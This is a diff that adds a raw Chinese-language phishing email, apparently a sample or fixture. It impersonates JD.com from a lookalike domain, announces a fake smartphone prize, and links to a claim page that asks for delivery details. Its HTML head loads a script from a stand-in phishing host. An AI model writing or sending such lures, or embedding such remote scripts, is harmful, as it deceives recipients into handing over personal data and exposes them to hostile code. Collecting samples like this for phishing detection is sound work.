@@ -1,0 +1,25 @@
+Received: from marketing.jd-promo.cn ([118.193.38.44])
+	by mx.qq.com (Tencent) with ESMTP id t8C4bL1g008273
+	for <lucky_zhang@qq.com>; Sun, 08 Jun 2025 19:20:25 +0800 (CST)
+Message-ID: <PROMO-JD-202506081920@jd-promo.cn>
+Date: Sun, 08 Jun 2025 19:20:24 +0800
+From: "京东商城" <promo@jd-promo.cn>
+To: <lucky_zhang@qq.com>
+Subject: =?gb2312?B?s6y1vcrH0OjQob/F5NbDyc8=?=
+Mime-Version: 1.0
+Content-Type: text/html; charset="gb2312"
+
+<html>
+<head>
+<script src="http://phish-scripts.com/promo_redirect.py"></script>
+</head>
+<body>
+<p>恭喜您！</p>
+<p>您的京东账户 <b>lucky_zhang</b> 在我们的六月幸运抽奖活动中，获得了一等奖！</p>
+<p><b>奖品：最新款智能手机一部</b></p>
+<p>请点击下方按钮，在活动页面填写您的收货信息。奖品将在7个工作日内寄出。</p>
+<p><a href="http://www.jd-promo.cn/winner/claim.jsp?uid=lucky_zhang"><b>[ 立即领奖 ]</b></a></p>
+<p>祝您购物愉快！</p>
+<p>京东商城 市场部</p>
+</body>
+</html>
